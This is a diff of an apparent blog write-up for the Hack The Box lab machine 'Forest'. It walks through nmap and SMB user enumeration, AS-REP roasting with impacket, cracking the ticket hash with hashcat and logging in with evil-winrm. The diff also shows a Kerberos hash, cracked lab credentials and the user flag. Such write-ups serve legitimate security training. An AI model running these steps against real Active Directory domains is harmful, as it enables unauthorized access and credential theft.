@@ -6,18 +6,19 @@ tags: [linux, Active Directory, Kali, Pentest, writeups, ctf]
 ---
 My write-up / walktrough for Forest on Hack The Box. 
 
-IP is 10.10.10.161, forest.htb
+# Quick summary
+today, Forest got retired and I'm allowed to publish my write-up. Forest is my second box on HTB, so still pleeeeenty of new things to learn for me ;-)
+
+I added the box to `/etc/hosts` as `forest.htb` with it's ip `10.10.10.161`
 
 ![forest](/images/forest/forest.png)
 
-## Enumeration
-`nmap -sV -p 1-10000 -T5 forest.htb`
+# Enumeration
+I started with `nmap -sV -p 1-10000 -T5 forest.htb` and revealed plenty of open ports. Well, as the box-name allready mentioned, there is an Active Directory running on it.
 
 ![nmap](/images/forest/nmap.png)
 
-used `legion`
-
-smbenum gave me 
+So let's try to gather some usernames. I used `legion`, added `forest.htb` as only host to it and let it run. After a while, `smbenum` gave me the following user:
 
 ```
 user:[Administrator] rid:[0x1f4]
@@ -53,22 +54,26 @@ user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
 ```
 
-able to ASRepRoast
+# ASRepRoast
+So let's look if one ore more users don't need preauthentication. I saved just the usernames in a textfile `user.txt`
 
-`sudo python3 /usr/local/bin/GetNPUsers.py -dc-ip 10.10.10.161 -no-pass -usersfile user.txt htb.local/
-`
+![usernames](/images/forest/usernames.png)
 
-```$krb5asrep$23$svc-alfresco@HTB.LOCAL:206e99c105941b80bb9ce49a11f10b0a$33d27576ae3f6c4c01f30b03fe45ae0eb20a12d2768ca6cf0e2d747e38e2406181c5d030bd9b0a9f7eeebef78955939b5b66a799b760723d1a5ed32471bf9234d2b0a2e08f71330cf36b76b2b43a17776df8fea2155674009953f336e852f7b14a6ad5ef11619dcf7761300dd1bc7bda3363f6303448f0759399339ea26ca964f2ace2e3d7959c7ce22bf12b4f756f67b1ba52795cbd97ed3e04dbfb8b8ee37b2f253bc8637dcb2270225eee5e625e8f2e77c085e62bad96bd003b39e961373f61cb8e50411fb2d36a548cd5721eb8f7aa271b62ba32c4fc8fe94b687c9943bf7ce5db4229da
-```
+and ran `sudo python3 /usr/local/bin/GetNPUsers.py -dc-ip 10.10.10.161 -no-pass -usersfile user.txt htb.local/
+` from impacket. (a great toolset, btw)
 
 ![asreproast](/images/forest/asreproast.png)
-
+Yeah! There is the user `svc-alfresco` where I could gather a ticket of.
 
 `GetNPUsers.py` can create a well formated file right away by passing the parameter `-format hashcat -outputfile userhash.txt`
+
+# crack the hash
 
 Done so, I could afterwards crack the hash with `hashcat -m18200 --force userhash.txt  /usr/share/wordlists/rockyou.txt` which gives me the credentials `svc-alfresco:s3rvice`
 
 ![hashcat](/images/forest/hashcat.png)
+
+# Own the user...
 
 this credentials, I could use to establish a connection with winrm (`evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
 `) and grab the user-flag `e5e4e47ae7022664cda6eb013fb0d9ed`.
